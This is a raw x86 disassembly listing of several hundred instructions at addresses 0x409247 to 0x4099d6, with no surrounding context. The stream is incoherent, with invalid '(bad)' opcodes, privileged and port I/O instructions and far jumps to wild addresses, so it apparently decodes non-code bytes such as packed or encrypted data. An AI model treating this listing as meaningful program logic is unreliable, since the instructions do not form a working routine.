  409247:	les    esp,FWORD PTR [ebx-0x4b]
  40924a:	popa   
  40924b:	push   esi
  40924c:	outs   dx,DWORD PTR ds:[esi]
  40924d:	pop    esp
  40924e:	rol    BYTE PTR [edi+ebp*4-0x76],cl
  409252:	aam    0x21
  409254:	lods   al,BYTE PTR ds:[esi]
  409255:	or     bl,dh
  409257:	popa   
  409258:	mov    BYTE PTR [eax+0x3d],ch
  40925b:	fwait
  40925c:	mov    ebp,0xda117c4d
  409261:	cmp    al,0xfd
  409263:	jo     0x409269
  409265:	iret   
  409266:	mov    eax,ds:0xd99988f9
  40926b:	mov    BYTE PTR [edi-0x1fdf0d7b],bh
  409271:	cdq    
  409272:	sbb    al,0x70
  409274:	lock fistp QWORD PTR [ecx-0x1a]
  409278:	jo     0x40923e
  40927a:	add    BYTE PTR [eax-0x4],ah
  40927d:	jae    0x4092c3
  40927f:	cmc    
  409280:	add    DWORD PTR [ecx-0x2a],esp
  409283:	mov    DWORD PTR [esi+0x31],esi
  409286:	rcr    DWORD PTR [eax+0x1e],cl
  409289:	jg     0x4092e1
  40928b:	(bad)  
  40928c:	jecxz  0x40925c
  40928e:	mov    ch,0xa4
  409290:	or     BYTE PTR [eax+0x1d],dh
  409293:	cmp    DWORD PTR [edi+eax*8-0x358683a],esp
  40929a:	push   edx
  40929b:	cs jmp 0x4092da
  40929e:	daa    
  40929f:	pop    esi
  4092a0:	inc    esp
  4092a1:	retf   
  4092a2:	lods   eax,DWORD PTR ds:[esi]
  4092a3:	inc    edx
  4092a4:	jmp    0xc04b953d
  4092a9:	jp     0x409271
  4092ab:	lods   eax,DWORD PTR ds:[esi]
  4092ac:	popa   
  4092ad:	and    ch,ah
  4092af:	scas   eax,DWORD PTR es:[edi]
  4092b0:	sub    al,0x98
  4092b2:	push   ebp
  4092b3:	cdq    
  4092b4:	sub    eax,0x9e0d146
  4092b9:	fist   WORD PTR [esi]
  4092bb:	and    DWORD PTR [esi-0x63],ecx
  4092be:	adc    edi,ebp
  4092c0:	sub    DWORD PTR [ecx+ecx*2-0x46],edx
  4092c4:	push   ebx
  4092c5:	ss ss (bad) 
  4092c9:	mov    BYTE PTR [ebp+edx*1+0x0],cl
  4092cd:	xchg   edx,eax
  4092ce:	sbb    dh,dh
  4092d0:	dec    edx
  4092d1:	pop    ebp
  4092d2:	jo     0x4092f4
  4092d4:	data16 (bad) es:[ebp-0x66ff1252]
  4092dc:	and    esp,DWORD PTR [eax+0x63a3dd45]
  4092e2:	push   es
  4092e3:	arpl   si,bp
  4092e5:	and    BYTE PTR [ecx],bh
  4092e7:	add    dh,ah
  4092e9:	stc    
  4092ea:	les    esp,FWORD PTR [edx-0x6c02b01d]
  4092f0:	sub    BYTE PTR [edx],bl
  4092f2:	jnp    0x4092a3
  4092f4:	inc    ebp
  4092f5:	out    0x1f,al
  4092f7:	ss pop ds
  4092f9:	mov    dh,0x56
  4092fb:	xchg   edi,eax
  4092fc:	pop    esi
  4092fd:	push   ebx
  4092fe:	push   eax
  4092ff:	outs   dx,BYTE PTR ds:[esi]
  409300:	sub    eax,0x75d2adc6
  409305:	into   
  409306:	dec    edi
  409307:	xchg   ebx,eax
  409308:	js     0x4092f4
  40930a:	pop    eax
  40930b:	push   es
  40930c:	mov    al,ds:0x1c89eb5c
  409311:	ins    DWORD PTR es:[edi],dx
  409312:	jb     0x40935c
  409314:	je     0x409357
  409316:	fidiv  WORD PTR [ebp+edx*2-0x1f]
  40931a:	sub    DWORD PTR [ebx+0x43],edi
  40931d:	cli    
  40931e:	cmp    DWORD PTR [esi+0x53],ebp
  409321:	dec    eax
  409322:	sbb    ecx,ebp
  409324:	xchg   edi,eax
  409325:	fld    DWORD PTR [edx+0x648a53fa]
  40932b:	and    cl,al
  40932d:	sbb    al,0x37
  40932f:	mov    dl,0xea
  409331:	pop    esi
  409332:	sbb    ah,BYTE PTR [ebx]
  409334:	neg    BYTE PTR [edx-0x13]
  409337:	mov    al,0xfa
  409339:	pop    edx
  40933a:	lods   eax,DWORD PTR ds:[esi]
  40933b:	ror    DWORD PTR [edx+0x1],cl
  40933e:	mov    ecx,0xdc098ce5
  409343:	inc    ebx
  409344:	push   es
  409345:	cmp    al,0x7
  409347:	loope  0x4092dc
  409349:	xor    dl,BYTE PTR [eax]
  40934b:	jns    0x40930d
  40934d:	int    0x95
  40934f:	mov    ds:0x74eed8c8,eax
  409354:	mov    eax,ds:0x8e5d2014
  409359:	ins    BYTE PTR es:[edi],dx
  40935a:	jbe    0x409340
  40935c:	ret    0xbb42
  40935f:	fld    TBYTE PTR [ebp+0x4a1167c3]
  409365:	push   ecx
  409366:	shl    BYTE PTR [eax-0x72],1
  409369:	test   DWORD PTR [ebx],ebx
  40936b:	mov    WORD PTR [ebx+ecx*8],cs
  40936e:	push   edi
  40936f:	outs   dx,DWORD PTR ds:[esi]
  409370:	xchg   esi,eax
  409371:	adc    eax,0xbaa28214
  409376:	adc    ebp,DWORD PTR [ebp+0x2]
  409379:	(bad)  
  40937a:	ins    DWORD PTR es:[edi],dx
  40937b:	cmp    BYTE PTR [eax],0xf3
  40937e:	pushf  
  40937f:	call   0xdd7a:0xde0e75ae
  409386:	mov    al,ds:0xef8094ed
  40938b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40938c:	aas    
  40938d:	mov    cl,0xb6
  40938f:	cmp    ah,BYTE PTR [esi+0x5]
  409392:	pop    es
  409393:	mov    dl,0xf8
  409395:	rcl    DWORD PTR [eax+0x39],cl
  409398:	mov    edx,fs
  40939a:	pop    edx
  40939b:	in     eax,0xb7
  40939d:	xchg   BYTE PTR [ebp+ebp*8+0x13],bl
  4093a1:	(bad)  
  4093a2:	retf   
  4093a3:	sbb    edx,ebp
  4093a5:	adc    ecx,DWORD PTR [edx-0x51]
  4093a8:	loope  0x409375
  4093aa:	(bad)  
  4093ac:	push   edx
  4093ad:	fst    st(1)
  4093af:	jo     0x409398
  4093b1:	outs   dx,DWORD PTR ds:[esi]
  4093b2:	jmp    0x409370
  4093b4:	xchg   ebx,eax
  4093b5:	pop    es
  4093b6:	pop    eax
  4093b7:	das    
  4093b8:	or     al,0xf9
  4093ba:	jmp    0xfcb3:0x3f6d2846
  4093c1:	int    0x5e
  4093c3:	and    eax,0xee9cc5a3
  4093c8:	mov    ebx,0xcd4637d1
  4093cd:	stc    
  4093ce:	jbe    0x409405
  4093d0:	shl    bl,cl
  4093d2:	jle    0x4093ef
  4093d4:	xchg   ebx,eax
  4093d5:	loop   0x4093e7
  4093d7:	out    dx,al
  4093d8:	sar    BYTE PTR [ebx],0xe1
  4093db:	mov    edx,0x8f4d0646
  4093e0:	push   0xffffff8e
  4093e2:	and    al,0xe7
  4093e4:	bound  ebx,QWORD PTR [ebx-0x55]
  4093e7:	mov    ?,WORD PTR [esi]
  4093e9:	dec    edx
  4093ea:	adc    eax,0x21926bff
  4093ef:	mov    esp,0x371f9d40
  4093f4:	(bad)  
  4093f5:	xchg   ecx,eax
  4093f6:	mov    eax,0x3a40c828
  4093fb:	xor    eax,0xaf112eab
  409400:	xor    ebx,DWORD PTR [ebp+0x2d39e526]
  409406:	fcomp  DWORD PTR [edi-0x64]
  409409:	fist   WORD PTR [ebp+0x2e921245]
  40940f:	sbb    eax,0xcb989975
  409414:	or     edi,DWORD PTR [edx+ecx*2+0x4e]
  409418:	jg     0x40948c
  40941a:	es mov eax,0x9865d51d
  409420:	push   ebp
  409421:	pop    ebp
  409422:	fwait
  409423:	das    
  409424:	repz retf 
  409426:	into   
  409427:	ss jle 0x409448
  40942a:	call   0xd47a7097
  40942f:	(bad)  
  409430:	fiadd  DWORD PTR [ebp-0x5c]
  409433:	or     BYTE PTR [ebx],bh
  409435:	mov    ds:0xb42ba24c,eax
  40943a:	test   DWORD PTR [ebp+0x2e],ebp
  40943d:	aam    0xb1
  40943f:	retf   0x4063
  409442:	xor    DWORD PTR [edi-0x54],esi
  409445:	aas    
  409446:	aas    
  409447:	call   0x62f703e2
  40944c:	jbe    0x40942d
  40944e:	and    eax,0x1c781909
  409453:	and    DWORD PTR [eax-0x42a74cad],edi
  409459:	cmp    al,0x86
  40945b:	mov    ebp,0x88b03b1a
  409460:	lods   al,BYTE PTR ds:[esi]
  409461:	rcl    BYTE PTR [ebx-0x7abdaed5],cl
  409467:	xchg   BYTE PTR [ecx+0x626547c7],ah
  40946d:	sbb    eax,0x2ead29c6
  409472:	loopne 0x409423
  409474:	data16 xor al,0x81
  409477:	loopne 0x40948b
  409479:	test   DWORD PTR [edx+0x15d07f5c],ebx
  40947f:	push   edi
  409480:	dec    ecx
  409481:	xchg   ebx,eax
  409482:	ss in  eax,0xc4
  409485:	jnp    0x409437
  409487:	cmp    DWORD PTR [ebp+ebx*8-0x2a46cf3e],eax
  40948e:	sub    bh,BYTE PTR [edi+0x0]
  409491:	xlat   BYTE PTR ds:[ebx]
  409493:	cs addr16 pop ss
  409496:	dec    edi
  409497:	pop    ebp
  409498:	cwde   
  409499:	jno    0x40941b
  40949b:	jmp    0x40947e
  40949d:	xchg   ebx,eax
  40949e:	js     0x409473
  4094a0:	(bad)  
  4094a1:	stos   BYTE PTR es:[edi],al
  4094a2:	nop
  4094a3:	loope  0x4094c6
  4094a5:	xor    ch,ah
  4094a7:	jb     0x4094a4
  4094a9:	(bad)  
  4094aa:	xchg   ecx,eax
  4094ab:	jp     0x40951e
  4094ad:	inc    esi
  4094ae:	ins    DWORD PTR es:[edi],dx
  4094af:	xchg   esi,eax
  4094b0:	pushf  
  4094b1:	xor    esp,DWORD PTR [ebx-0x30a56539]
  4094b7:	jecxz  0x409504
  4094b9:	dec    edx
  4094ba:	icebp  
  4094bb:	jae    0x4094d8
  4094bd:	pop    eax
  4094be:	adc    DWORD PTR [esp+edi*1+0x50],edx
  4094c2:	mov    DWORD PTR [ecx-0x38],ecx
  4094c5:	out    0xd9,eax
  4094c7:	add    BYTE PTR [ebx-0x11],ah
  4094ca:	inc    esi
  4094cb:	loope  0x4094cf
  4094cd:	cmp    DWORD PTR [ebx+0x211d11d],ebx
  4094d3:	inc    DWORD PTR [edi-0x32]
  4094d6:	xlat   BYTE PTR ds:[ebx]
  4094d7:	hlt    
  4094d8:	mov    ebp,0x61e99280
  4094dd:	xchg   DWORD PTR [edx+0x67],ecx
  4094e0:	mov    ch,0x2
  4094e2:	aam    0xdb
  4094e4:	jl     0x4094c2
  4094e6:	or     BYTE PTR [edx+edi*4-0xdc04d6f],bl
  4094ed:	mov    cs,WORD PTR [edi-0x77]
  4094f0:	imul   ebx,ecx,0xfe382ad9
  4094f6:	jmp    0x7feb65
  4094fb:	xchg   DWORD PTR [eax],ebx
  4094fd:	scas   al,BYTE PTR es:[edi]
  4094fe:	stos   DWORD PTR es:[edi],eax
  4094ff:	jne    0x4094ab
  409501:	xor    edx,ebx
  409503:	stos   BYTE PTR es:[edi],al
  409504:	repz cmp al,0x10
  409507:	jb     0x4094fa
  409509:	push   cs
  40950a:	into   
  40950b:	fistp  DWORD PTR [edx-0x39]
  40950e:	pop    edi
  40950f:	dec    ebx
  409510:	hlt    
  409511:	xchg   edx,eax
  409512:	aas    
  409513:	outs   dx,BYTE PTR ds:[esi]
  409514:	pop    eax
  409515:	cmp    al,0x70
  409517:	sbb    ebx,ebx
  409519:	lea    ebx,[edi+0x7]
  40951c:	cmc    
  40951d:	ret    0x7c6b
  409520:	inc    ebx
  409521:	dec    ebp
  409522:	loopne 0x409557
  409524:	cmc    
  409525:	loopne 0x4094e0
  409527:	mov    edx,0x12dda461
  40952c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40952d:	mov    DWORD PTR [edi+edx*1-0x6],edi
  409531:	(bad)  
  409532:	stos   BYTE PTR es:[edi],al
  409533:	cmp    BYTE PTR [eax],bh
  409535:	cmp    BYTE PTR [edi-0x55],dl
  409538:	fucom  st(2)
  40953a:	jb     0x40958a
  40953c:	mov    ebx,0x9f72c028
  409541:	rol    DWORD PTR [edx],0x67
  409544:	sar    BYTE PTR [edi-0x1d7eaf2f],cl
  40954a:	jmp    0x2d0eec16
  40954f:	jl     0x409543
  409551:	inc    ebp
  409552:	addr16 inc esp
  409554:	xchg   edi,eax
  409555:	mov    eax,ds:0x3c7d8b7e
  40955a:	cmp    BYTE PTR [eax-0x3b088e61],ch
  409560:	and    eax,ebx
  409562:	jb     0x40953d
  409564:	xchg   esp,eax
  409565:	cmp    edx,DWORD PTR [eax]
  409567:	les    ecx,FWORD PTR [eax+esi*8+0x1a59ba56]
  40956e:	aas    
  40956f:	ret    0xce1a
  409572:	adc    al,0x23
  409574:	xor    al,0xe9
  409576:	push   0xd1093636
  40957b:	sbb    al,0xf6
  40957d:	es mov bh,0xc7
  409580:	ins    BYTE PTR es:[edi],dx
  409581:	pushf  
  409582:	outs   dx,DWORD PTR ds:[esi]
  409583:	push   ebx
  409584:	push   eax
  409585:	scas   eax,DWORD PTR es:[edi]
  409586:	push   cs
  409587:	inc    eax
  409588:	hlt    
  409589:	cli    
  40958a:	std    
  40958b:	mov    BYTE PTR [edx],dl
  40958d:	jne    0x409562
  40958f:	pushf  
  409590:	push   edi
  409591:	xchg   ebp,eax
  409592:	or     BYTE PTR [esi-0x29],dh
  409595:	jae    0x4095ee
  409597:	xlat   BYTE PTR ds:[ebx]
  409598:	cmp    edi,ecx
  40959a:	add    DWORD PTR [ecx],esi
  40959c:	out    dx,al
  40959d:	xor    al,ah
  40959f:	jmp    0xb8109487
  4095a4:	sub    al,0x90
  4095a6:	aaa    
  4095a7:	inc    edi
  4095a8:	xchg   edx,eax
  4095a9:	jp     0x4095a3
  4095ab:	clc    
  4095ac:	sahf   
  4095ad:	pop    ss
  4095ae:	or     DWORD PTR [ebx],esp
  4095b0:	push   edx
  4095b1:	and    ebp,DWORD PTR [ebp+0x42]
  4095b4:	lahf   
  4095b5:	repnz mov bl,0x18
  4095b8:	jo     0x409626
  4095ba:	je     0x40957d
  4095bc:	add    BYTE PTR ds:0xb57244cd,dh
  4095c2:	xlat   BYTE PTR ds:[ebx]
  4095c3:	icebp  
  4095c4:	data16 xor al,0xb6
  4095c7:	out    dx,al
  4095c8:	push   edi
  4095c9:	or     dh,bl
  4095cb:	jno    0x4095aa
  4095cd:	mov    ah,0xda
  4095cf:	jge    0x40961b
  4095d1:	js     0x40958c
  4095d3:	int    0x3a
  4095d5:	xchg   edx,eax
  4095d6:	imul   esp,DWORD PTR [ecx],0x27830f52
  4095dc:	xchg   esp,eax
  4095dd:	mov    esp,0x6506d3a0
  4095e2:	retf   
  4095e3:	pop    ebx
  4095e4:	pop    eax
  4095e5:	fsubr  st,st(7)
  4095e7:	adc    eax,0xacd69083
  4095ec:	mov    bh,0x60
  4095ee:	daa    
  4095ef:	lea    ebp,[ebp+esi*1-0x5c]
  4095f3:	ds xchg edx,eax
  4095f5:	add    eax,0xdce05119
  4095fa:	cmp    eax,0x30cc4b66
  4095ff:	or     edx,DWORD PTR [esi+0x29eeefb8]
  409605:	cdq    
  409606:	pop    es
  409607:	shr    DWORD PTR [edi-0x5284d8bb],1
  40960d:	pop    ds
  40960e:	dec    ecx
  40960f:	jmp    0x4095e5
  409611:	int3   
  409612:	mov    dl,0x38
  409614:	fidiv  DWORD PTR [edi]
  409616:	and    ch,BYTE PTR [edx]
  409618:	inc    edi
  409619:	stos   DWORD PTR es:[edi],eax
  40961a:	add    al,0xeb
  40961c:	mov    ?,WORD PTR [ecx-0x28a0db64]
  409622:	push   esi
  409623:	or     eax,0x3a01481
  409628:	ds scas al,BYTE PTR es:[edi]
  40962a:	test   BYTE PTR [esi+eax*1+0x74],dl
  40962e:	lods   al,BYTE PTR ds:[esi]
  40962f:	xor    eax,0xaf820f43
  409634:	ins    DWORD PTR es:[edi],dx
  409635:	gs pcmpeqb mm3,mm4
  409639:	sub    ebx,esi
  40963b:	cmp    esp,edi
  40963d:	mov    ds:0x1385cb1e,eax
  409642:	inc    ecx
  409643:	aas    
  409644:	popa   
  409645:	push   ebp
  409646:	aas    
  409647:	(bad)  
  409648:	and    eax,0xf1438b78
  40964d:	cs call 0x551d1c6a
  409653:	jbe    0x409695
  409655:	push   cs
  409656:	stos   BYTE PTR es:[edi],al
  409657:	mov    eax,ds:0x1ffe4ce6
  40965c:	popa   
  40965d:	pop    ss
  40965e:	iret   
  40965f:	cld    
  409660:	shl    DWORD PTR [ebx-0x24],cl
  409663:	ins    DWORD PTR es:[edi],dx
  409664:	outs   dx,DWORD PTR ds:[esi]
  409665:	stc    
  409666:	sbb    ebp,edi
  409668:	mov    DWORD PTR [ebp+0x4034a273],0xfd099583
  409672:	jg     0x4096ec
  409674:	(bad)  
  409675:	cmc    
  409676:	inc    ecx
  409677:	(bad)  
  409678:	fild   DWORD PTR [ebx]
  40967a:	inc    esi
  40967b:	cmp    esi,DWORD PTR [ecx]
  40967d:	mov    eax,ds:0xede8b40f
  409682:	ret    0xe59d
  409685:	cwde   
  409686:	xor    esi,DWORD PTR [esi]
  409688:	pop    esp
  409689:	or     bl,BYTE PTR [edx+ebp*4-0x2d]
  40968d:	and    eax,0x39e4abda
  409692:	push   esp
  409693:	pop    eax
  409694:	adc    eax,0xb71f743e
  409699:	jnp    0x40967e
  40969b:	fwait
  40969c:	or     al,0xaa
  40969e:	nop
  40969f:	stos   DWORD PTR es:[edi],eax
  4096a0:	ret    0x1993
  4096a3:	ss jns 0x4096bd
  4096a6:	imul   eax,DWORD PTR [ebx-0x71909f4a],0xc874053f
  4096b0:	aad    0x96
  4096b2:	jp     0x409696
  4096b4:	shl    BYTE PTR [edi+0x2d],1
  4096b7:	iret   
  4096b8:	dec    esi
  4096b9:	jb     0x409713
  4096bb:	cs pop ds
  4096bd:	push   edi
  4096be:	dec    ebx
  4096bf:	(bad)  
  4096c0:	push   ss
  4096c1:	adc    bl,BYTE PTR [edi+edx*4-0x51]
  4096c5:	cmp    al,0x73
  4096c7:	pop    esi
  4096c8:	mov    dl,0xdb
  4096ca:	add    cl,ah
  4096cc:	inc    esp
  4096cd:	jb     0x4096ba
  4096cf:	inc    ecx
  4096d0:	pop    ds
  4096d1:	mov    bh,0xba
  4096d3:	rol    BYTE PTR [esi-0x24d0b913],cl
  4096d9:	mov    bl,0x8f
  4096db:	fadd   QWORD PTR [eax-0x37]
  4096de:	push   ss
  4096df:	push   0x69
  4096e1:	fnstenv [ebx+0x61]
  4096e4:	dec    edi
  4096e5:	iret   
  4096e6:	scas   eax,DWORD PTR es:[edi]
  4096e7:	jno    0x409758
  4096e9:	xchg   ebx,eax
  4096ea:	cmp    esp,DWORD PTR [ebx-0x7a712938]
  4096f0:	ins    DWORD PTR es:[edi],dx
  4096f1:	xor    BYTE PTR [edi-0x4f2bfbad],ah
  4096f7:	sub    cl,0xb5
  4096fa:	call   0x193782fd
  4096ff:	aad    0xd2
  409701:	sub    DWORD PTR [ebp+0x33ab02a],ebp
  409707:	js     0x409735
  409709:	xor    eax,0xa98f495
  40970e:	push   ebp
  40970f:	fs inc eax
  409711:	or     DWORD PTR [edx-0x4b40c85d],esp
  409717:	ss push esi
  409719:	mov    edi,0xd192b504
  40971e:	out    dx,eax
  40971f:	sbb    ecx,ebx
  409721:	arpl   WORD PTR [ebx+ebx*4-0x1c],bx
  409725:	fcomp  st(5)
  409727:	sub    ebx,esi
  409729:	shl    cl,1
  40972b:	push   cs
  40972c:	pop    ebp
  40972d:	out    dx,al
  40972e:	sbb    bh,al
  409730:	int3   
  409731:	pusha  
  409732:	stc    
  409733:	pop    ebp
  409734:	ins    BYTE PTR es:[edi],dx
  409735:	xchg   esp,eax
  409736:	stos   BYTE PTR es:[edi],al
  409737:	jmp    0x50a0:0x881af0de
  40973e:	inc    esp
  40973f:	adc    ebp,DWORD PTR [ebx]
  409741:	push   0x5ff847bf
  409746:	inc    edi
  409747:	(bad)  
  409749:	inc    ecx
  40974a:	xchg   edx,eax
  40974b:	ds nop
  40974d:	cdq    
  40974e:	xor    ah,BYTE PTR [esi-0x5aedd7d3]
  409754:	retf   
  409755:	jnp    0x409722
  409757:	jb     0x409773
  409759:	fbstp  TBYTE PTR [ebx+0x1bdd55e6]
  40975f:	jne    0x409706
  409761:	jno    0x409787
  409763:	and    BYTE PTR [ebp-0x6e],0x21
  409767:	imul   ebp,DWORD PTR [edi],0x4097213e
  40976d:	in     eax,dx
  40976e:	xor    DWORD PTR [ebx+0x37],0xffffffe5
  409772:	fidivr DWORD PTR [eax]
  409774:	jge    0x409747
  409776:	call   0x18e69477
  40977b:	jge    0x409701
  40977d:	int    0x93
  40977f:	daa    
  409780:	adc    al,0x1b
  409782:	call   0x1866fb8c
  409787:	mov    al,0x38
  409789:	xor    edi,ecx
  40978b:	pop    ebp
  40978c:	xchg   ebp,eax
  40978d:	mov    eax,0xe8264411
  409792:	xchg   edi,eax
  409793:	mov    BYTE PTR [edi+0x20],bh
  409796:	enter  0x19d5,0xdd
  40979a:	adc    cl,BYTE PTR [eax]
  40979c:	aad    0x9c
  40979e:	add    dh,dh
  4097a0:	xchg   ebp,eax
  4097a1:	adc    al,0x5d
  4097a3:	dec    ebx
  4097a4:	push   ecx
  4097a5:	jp     0x409802
  4097a7:	ret    
  4097a8:	xchg   edx,eax
  4097a9:	or     al,BYTE PTR [ebx+0x6d7cafca]
  4097af:	mov    ch,0xe8
  4097b1:	aam    0xec
  4097b3:	sub    ebp,DWORD PTR [edx+0x6f8bfae7]
  4097b9:	mov    dh,0x49
  4097bb:	sub    ah,BYTE PTR [esi+0x7c]
  4097be:	popf   
  4097bf:	fild   DWORD PTR [esp+eax*8]
  4097c2:	add    ebx,esp
  4097c4:	iret   
  4097c5:	rcl    DWORD PTR [esi+0x48],cl
  4097c8:	adc    eax,0x8e39b43f
  4097cd:	xor    DWORD PTR [eax+0x22163933],esi
  4097d3:	push   0xe
  4097d5:	xchg   edx,eax
  4097d6:	add    eax,0x6cbe006d
  4097db:	out    0xc8,al
  4097dd:	adc    al,0xc8
  4097df:	imul   esi,DWORD PTR [edi-0x20462578],0x4e
  4097e6:	sahf   
  4097e7:	gs sti 
  4097e9:	mov    bl,0xe2
  4097eb:	outs   dx,DWORD PTR ds:[esi]
  4097ec:	and    esi,edx
  4097ee:	mov    ebx,DWORD PTR [eax+0x28]
  4097f1:	or     eax,0x805e4b42
  4097f6:	or     BYTE PTR [ebx+0x313e31c0],bh
  4097fc:	or     al,bl
  4097fe:	and    BYTE PTR [ebx-0x54],ah
  409801:	out    0xfe,al
  409803:	into   
  409804:	mov    esp,0xd327e36e
  409809:	jecxz  0x40985b
  40980b:	adc    edi,DWORD PTR [ecx+0x2335ff47]
  409811:	into   
  409812:	outs   dx,BYTE PTR ds:[esi]
  409813:	fwait
  409814:	lods   eax,DWORD PTR ds:[esi]
  409815:	mov    ebx,0xa65da826
  40981a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40981b:	repz in al,0x2f
  40981e:	jne    0x409867
  409820:	adc    DWORD PTR [esi],0xffffffde
  409823:	cdq    
  409824:	rcl    DWORD PTR [edi],0xb9
  409827:	lods   al,BYTE PTR ds:[esi]
  409828:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409829:	shl    DWORD PTR [edx+ecx*4],cl
  40982c:	and    eax,0x5ebcc7c1
  409831:	test   eax,0xe45750bc
  409836:	shl    dl,1
  409838:	jae    0x40984a
  40983a:	mov    ds:0x1142d512,al
  40983f:	mov    bl,0x1e
  409841:	lds    esi,FWORD PTR [ebx-0xe]
  409844:	or     BYTE PTR [eax+0x32f7628e],0x8b
  40984b:	or     bl,bh
  40984d:	(bad)  
  40984e:	sar    DWORD PTR [esi-0x5b],1
  409851:	or     edi,DWORD PTR [edi+edi*2-0x4a95bfa7]
  409858:	cwde   
  409859:	mov    ah,0x25
  40985b:	mov    eax,ds:0xfb0f6cf8
  409860:	jne    0x409814
  409862:	push   edx
  409863:	jl     0x40986f
  409865:	adc    al,BYTE PTR [ebx-0x5a8fff80]
  40986b:	add    al,0x96
  40986d:	ret    0x131c
  409870:	lods   al,BYTE PTR ds:[esi]
  409871:	(bad)  
  409872:	fisubr DWORD PTR [ebx+0x29]
  409875:	jle    0x40983d
  409877:	lock lea ecx,[esi]
  40987a:	(bad)  
  40987b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40987c:	inc    ebx
  40987d:	(bad)  
  40987f:	(bad)  
  409880:	sub    esi,DWORD PTR [ebp+0xe]
  409883:	mov    ds:0xe34131fc,al
  409888:	js     0x4098db
  40988a:	mov    ds:0x59f595e2,eax
  40988f:	push   es
  409890:	push   eax
  409891:	int    0xa5
  409893:	call   0xb75755ec
  409898:	mov    bh,0xf5
  40989a:	xor    esi,DWORD PTR [esi-0x8]
  40989d:	outs   dx,BYTE PTR ds:[esi]
  40989e:	aam    0xd3
  4098a0:	cwde   
  4098a1:	aam    0x82
  4098a3:	jp     0x409873
  4098a5:	stos   BYTE PTR es:[edi],al
  4098a6:	loope  0x40987e
  4098a8:	mov    ch,0xe5
  4098aa:	test   BYTE PTR [ebx],bl
  4098ac:	add    eax,0xe8f51dcd
  4098b1:	dec    ebx
  4098b2:	shl    BYTE PTR [ecx-0x39],cl
  4098b5:	mov    BYTE PTR [ebp+0x1d],dh
  4098b8:	or     cl,ch
  4098ba:	mov    esi,0x154910f1
  4098bf:	test   eax,0x9f6f3f98
  4098c4:	popf   
  4098c5:	xor    BYTE PTR [edi+0x3368d22f],ch
  4098cb:	sub    ebp,0xfffffffd
  4098ce:	inc    ebx
  4098cf:	outs   dx,BYTE PTR ds:[esi]
  4098d0:	xchg   edi,eax
  4098d1:	stos   BYTE PTR es:[edi],al
  4098d2:	fsub   DWORD PTR [eax]
  4098d4:	mov    dl,0x18
  4098d6:	out    0xbd,eax
  4098d8:	mov    eax,ds:0x24e70d00
  4098dd:	and    esi,DWORD PTR [ecx]
  4098df:	push   0x2a2923d3
  4098e4:	arpl   WORD PTR [esi-0x4965a5fb],dx
  4098ea:	shl    DWORD PTR [edi-0x1a],0x65
  4098ee:	inc    bl
  4098f0:	jno    0x4098f3
  4098f2:	sub    eax,DWORD PTR [ebp+0x6b58b0b4]
  4098f8:	mov    esp,gs
  4098fa:	fimul  DWORD PTR [edx-0x34314c0e]
  409900:	dec    eax
  409901:	jbe    0x409914
  409903:	into   
  409904:	jbe    0x409963
  409906:	push   ebp
  409907:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409908:	mov    ds:0x5f8072d2,al
  40990d:	add    BYTE PTR [esp+ecx*1+0x66b49b10],dl
  409914:	mov    bl,BYTE PTR [eax-0x36]
  409917:	push   eax
  409918:	jae    0x409956
  40991a:	dec    esi
  40991b:	xchg   esi,eax
  40991c:	test   BYTE PTR [edi+0xf],0xc
  409920:	pop    esp
  409921:	test   eax,0x5af72259
  409926:	dec    ecx
  409927:	jle    0x409984
  409929:	mov    al,0x4a
  40992b:	fsub   QWORD PTR [esi]
  40992d:	mov    ah,0xe5
  40992f:	jne    0x409900
  409931:	nop
  409932:	call   0x6720:0x20795b26
  409939:	mov    edx,0x18d5ae7a
  40993e:	sub    ecx,DWORD PTR [edx-0x49]
  409941:	jecxz  0x40990f
  409943:	and    eax,ebx
  409945:	stc    
  409946:	or     esi,esi
  409948:	and    eax,0xc5498167
  40994d:	and    eax,DWORD PTR [edi]
  40994f:	adc    ch,BYTE PTR [edx]
  409951:	or     eax,0xb7da0d9a
  409956:	scas   eax,DWORD PTR es:[edi]
  409957:	gs mov edx,0x68185706
  40995d:	in     al,dx
  40995e:	push   esp
  40995f:	(bad)  
  409960:	dec    edx
  409961:	outs   dx,DWORD PTR ds:[esi]
  409962:	mov    al,0x3c
  409964:	and    BYTE PTR [edi+0x52],dh
  409967:	addr16 dec esi
  409969:	(bad)  
  40996a:	retf   0x1f10
  40996d:	loope  0x4099ce
  40996f:	xchg   DWORD PTR [eax+0x36],ebp
  409972:	ds adc eax,0xbc1b0706
  409979:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40997a:	sahf   
  40997b:	push   ebx
  40997c:	pusha  
  40997d:	adc    cl,BYTE PTR [ecx]
  40997f:	lds    esi,FWORD PTR [edi-0x4c15a6c3]
  409985:	or     BYTE PTR [edi],al
  409987:	ins    BYTE PTR es:[edi],dx
  409988:	and    bl,cl
  40998a:	outs   dx,BYTE PTR ds:[esi]
  40998b:	xchg   ecx,eax
  40998c:	sub    BYTE PTR [ecx],bl
  40998e:	sub    al,0xdf
  409990:	fidiv  WORD PTR [eax+0x41fabd4b]
  409996:	xchg   edi,eax
  409997:	xchg   esp,eax
  409998:	push   0xfffffffb
  40999a:	cmp    dh,BYTE PTR [ecx-0x24969154]
  4099a0:	in     eax,dx
  4099a1:	and    dh,BYTE PTR [eax]
  4099a3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4099a4:	out    dx,al
  4099a5:	and    al,0x7e
  4099a7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4099a8:	jno    0x409a23
  4099aa:	sti    
  4099ab:	and    DWORD PTR [ecx-0x50],edx
  4099ae:	pop    edx
  4099af:	sub    al,0xe0
  4099b1:	adc    ah,cl
  4099b3:	sbb    BYTE PTR [ebp+0x122b9208],ch
  4099b9:	pop    ecx
  4099ba:	mov    bl,BYTE PTR [ebx]
  4099bc:	in     al,dx
  4099bd:	mov    dl,0x5d
  4099bf:	cmp    BYTE PTR ds:0x2924ebd0,bh
  4099c5:	pop    esp
  4099c6:	cmp    al,0x2
  4099c8:	push   esi
  4099c9:	mov    esi,0x6a2f6a56
  4099ce:	inc    BYTE PTR cs:[edi]
  4099d1:	jne    0x409a47
  4099d3:	dec    ebp
  4099d4:	push   0x2b
  4099d6:	inc    edx
